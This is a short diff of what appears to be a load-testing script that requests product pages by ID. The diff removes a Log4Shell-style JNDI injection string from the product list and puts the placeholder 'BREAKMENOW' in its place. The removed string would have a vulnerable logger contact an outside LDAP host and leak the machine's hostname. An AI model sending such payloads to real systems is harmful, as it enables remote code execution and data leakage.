@@ -27,7 +27,7 @@ products = [
     'L9ECAV7KIM',
     'LS4PSXUNUM',
     'OLJCESPC7Z',
-    '${jndi:ldap://${hostName}.legitwebsite.com.io.hax}']
+    'BREAKMENOW']
 
 def index(l):
     l.client.get("/")
